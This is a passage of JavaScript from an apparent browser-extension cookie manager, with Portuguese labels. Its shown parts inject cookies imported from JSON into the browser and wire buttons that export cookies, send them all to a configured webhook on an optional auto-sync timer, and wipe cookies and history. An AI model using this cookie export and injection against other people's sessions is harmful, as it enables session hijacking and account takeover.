        } catch (err) {
            showToast('Erro ao ler JSON: ' + err.message, 'error');
        }
    };
    reader.readAsText(file);
}

document.getElementById('btnApplyImport').addEventListener('click', async () => {
    if (!pendingImportData || pendingImportData.length === 0) return;

    const mode = document.querySelector('input[name="importMode"]:checked').value;
    fecharModal(modalImport);

    if (mode === 'inject') {
        showToast(`Gravando ${pendingImportData.length} cookies no navegador...`, 'info', 5000);
        let sucesso = 0;

        for (const c of pendingImportData) {
            try {
                const protocol = c.secure ? 'https:' : 'http:';
                const cleanDomain = (c.domain || '').startsWith('.') ? c.domain.substring(1) : (c.domain || 'localhost');
                const path = c.path || '/';
                const url = `${protocol}//${cleanDomain}${path}`;

                const cookieDetails = {
                    url: url,
                    name: c.name,
                    value: c.value || '',
                    path: path,
                    secure: !!c.secure,
                    httpOnly: !!c.httpOnly,
                    storeId: c.storeId || '0'
                };

                if (c.domain && !c.hostOnly) {
                    cookieDetails.domain = c.domain;
                }
                if (!c.session && c.expirationDate) {
                    cookieDetails.expirationDate = c.expirationDate;
                }
                if (c.sameSite && ['no_restriction', 'lax', 'strict'].includes(c.sameSite)) {
                    cookieDetails.sameSite = c.sameSite;
                }

                await new Promise(r => api.cookies.set(cookieDetails, () => r()));
                sucesso++;
            } catch (err) {
                console.warn('Erro ao restaurar cookie:', c.name, err);
            }
        }

        showToast(`${sucesso} cookies gravados no navegador!`, 'success');
        capturarCookies();
    } else {
        cookiesCache = pendingImportData;
        processarCookies();
        showToast(`${pendingImportData.length} cookies carregados para visualização!`, 'success');
    }

    pendingImportData = null;
});

document.addEventListener('DOMContentLoaded', async () => {
    iniciarParticulasNeon();
    await carregarConfiguracoes();
    await detectarAbaAtiva();
    capturarCookies();

    document.getElementById('btnAtualizar').addEventListener('click', () => {
        capturarCookies(() => showToast('Lista atualizada!', 'success'));
    });

    document.getElementById('btnExportarTodos').addEventListener('click', exportarTodosCookies);
    document.getElementById('btnWebhookTodos').addEventListener('click', enviarWebhookTodos);
    document.getElementById('btnLimparTodos').addEventListener('click', confirmarExclusaoTotal);

    document.getElementById('btnCopiarJSON').addEventListener('click', copiarTodosCookiesJSON);

    document.getElementById('btnImportarJSON').addEventListener('click', () => {
        document.getElementById('fileInput').click();
    });

    document.getElementById('fileInput').addEventListener('change', function () {
        if (this.files && this.files[0]) {
            iniciarImportacaoArquivo(this.files[0]);
        }
        this.value = '';
    });

    document.getElementById('btnExpandirTodos').addEventListener('click', () => {
        allExpanded = !allExpanded;
        if (allExpanded) {
            dominiosCache.forEach(d => expandedDomains.add(d.rawDomain));
        } else {
            expandedDomains.clear();
        }
        renderizarLista();
    });

    document.getElementById('btnOpenSettings').addEventListener('click', () => {
        abrirModal(modalSettings);
    });

    document.getElementById('btnSaveSettings').addEventListener('click', salvarConfiguracoes);
    document.getElementById('btnTestWebhook').addEventListener('click', testarConexaoWebhook);

    document.getElementById('chkAutoSync').addEventListener('change', function () {
        document.getElementById('groupAutoSyncInterval').style.display = this.checked ? 'block' : 'none';
    });

    btnFilterActiveTab.addEventListener('click', () => {
        activeFilter = 'activeTab';
        document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
        chipActiveTab.classList.add('active');
        renderizarLista();
    });

    document.querySelectorAll('.chip').forEach(chip => {
        chip.addEventListener('click', () => {
            document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
            chip.classList.add('active');
            activeFilter = chip.getAttribute('data-filter');
            renderizarLista();
        });
    });

    filtroTextoInput.addEventListener('input', renderizarLista);
    btnClearSearch.addEventListener('click', () => {
        filtroTextoInput.value = '';
        renderizarLista();
        filtroTextoInput.focus();
    });
});

let pendingFullWipeAction = null;

function _pollWipeStatus(startedAt, maxMs) {
    return new Promise((resolve) => {
        const t0 = Date.now();
        const interval = setInterval(() => {
            api.storage.local.get(['lastWipeResult'], (r) => {
                const res = r && r.lastWipeResult;
                if (res && res.startedAt >= startedAt) {
                    clearInterval(interval);
                    api.storage.local.remove(['lastWipeResult']);
                    resolve(res);
                } else if (Date.now() - t0 > maxMs) {
                    clearInterval(interval);
                    resolve(null);
                }
            });
        }, 800);
    });
}

async function executarWipeTotal(origin) {
    const label = origin ? `"${origin}"` : 'NAVEGADOR INTEIRO';
    const startedAt = Date.now();
    showToast(`WIPE iniciado em ${label}... aguarde`, 'info', 5000);

    await new Promise((resolve) => {
        api.storage.local.remove(['lastWipeResult'], () => {
            try {
                api.runtime.sendMessage({ action: 'FULL_WIPE', origin: origin }, () => {
                    resolve();
                });
            } catch (_) { resolve(); }
        });
    });

    const res = await _pollWipeStatus(startedAt, 120000);

    if (res && res.error) {
        showToast('Erro no WIPE: ' + res.error, 'error', 6000);
    } else if (res) {
        const ck = res.cookies || 0;
        const extra = res.history ? ' + histórico' : '';
        showToast(`WIPE concluído! ${ck} cookies${extra} apagados`, 'success', 7000);
    } else {
        showToast('WIPE ainda em execução — pode fechar, roda em background', 'warning', 6000);
    }

    capturarCookies();
}

const _origConfirmarExclusaoDominio = confirmarExclusaoDominio;

confirmarExclusaoDominio = function (domain) {
    _origConfirmarExclusaoDominio(domain);
    const domLimpo = domain.replace(/^\./, '');
    pendingFullWipeAction = async function () {
        fecharModal(modalConfirmDelete);
        await executarWipeTotal(domLimpo);
    };
    const btn = document.getElementById('btnConfirmFullWipe');
    if (btn) btn.textContent = 'WIPE TOTAL de ' + domLimpo;
    const sec = document.getElementById('fullWipeSection');
    if (sec) sec.style.display = 'block';
};

document.addEventListener('DOMContentLoaded', function () {
    const btnWipe = document.getElementById('btnWipeTotal');
    if (btnWipe) {
        btnWipe.addEventListener('click', () => {
            abrirModal(document.getElementById('modalWipeTotal'));
        });
    }

    const btnExec = document.getElementById('btnExecWipeTotal');
    if (btnExec) {
        btnExec.addEventListener('click', async () => {
            fecharModal(document.getElementById('modalWipeTotal'));
            await executarWipeTotal(null);
        });
    }

    const btnFull = document.getElementById('btnConfirmFullWipe');
    if (btnFull) {
        btnFull.addEventListener('click', async () => {
            if (typeof pendingFullWipeAction === 'function') {
                const act = pendingFullWipeAction;
                pendingFullWipeAction = null;
                await act();
            }
        });
    }

    const btnLimpar = document.getElementById('btnLimparTodos');
    if (btnLimpar) {
        btnLimpar.addEventListener('click', () => {
            pendingFullWipeAction = null;
            const sec = document.getElementById('fullWipeSection');
            if (sec) sec.style.display = 'none';
        }, true);
    }

    document.querySelectorAll('[data-close="modalConfirmDelete"]').forEach((el) => {
        el.addEventListener('click', () => {
            pendingFullWipeAction = null;
            const sec = document.getElementById('fullWipeSection');
            if (sec) sec.style.display = 'none';
        });
    });
});

document.addEventListener('DOMContentLoaded', function () {
    const btnDeathWipe = document.getElementById('btnDeathWipe');
    const btnExecDeathWipe = document.getElementById('btnExecDeathWipe');
    const modalDeathConfirm = document.getElementById('modalDeathConfirm');

    if (btnDeathWipe) {
        btnDeathWipe.addEventListener('click', function () {
            fecharModal(modalSettings);
            abrirModal(modalDeathConfirm);
        });
    }

    if (btnExecDeathWipe) {
        btnExecDeathWipe.addEventListener('click', async function () {
            fecharModal(modalDeathConfirm);
            await executarWipeTotal(null);
        });
    }
});